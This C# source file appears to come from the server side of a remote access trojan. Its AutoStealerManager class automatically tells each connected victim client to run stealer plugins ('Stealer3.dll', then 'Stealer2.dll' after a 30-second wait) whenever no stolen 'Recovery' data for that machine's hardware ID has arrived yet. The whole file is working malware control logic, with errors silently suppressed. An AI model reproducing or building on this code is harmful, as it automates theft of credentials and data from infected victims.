using System;
using System.IO;
using System.Threading.Tasks;
using Server.Connectings;

namespace Server.Helper;

internal class AutoStealerManager
{
	public static void ProcessClient(Clients client)
	{
		Form1 form = Program.form;
		if (form == null || form.settings?.AutoStealer != true || client == null || !client.itsConnect)
		{
			return;
		}
		Task.Run(async delegate
		{
			try
			{
				if (client.itsConnect)
				{
					string recoveryPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Users", client.Hwid, "Recovery");
					if (!Directory.Exists(recoveryPath) || Directory.GetFiles(recoveryPath, "*.*", SearchOption.AllDirectories).Length == 0)
					{
						client.Send(new object[3]
						{
							"Invoke",
							Methods.GetChecksum("Plugin\\Stealer3.dll"),
							new byte[1]
						});
						await Task.Delay(30000);
						if ((!Directory.Exists(recoveryPath) || Directory.GetFiles(recoveryPath, "*.*", SearchOption.AllDirectories).Length == 0) && client.itsConnect)
						{
							client.Send(new object[3]
							{
								"Invoke",
								Methods.GetChecksum("Plugin\\Stealer2.dll"),
								new byte[1]
							});
						}
					}
				}
			}
			catch
			{
			}
		});
	}
}
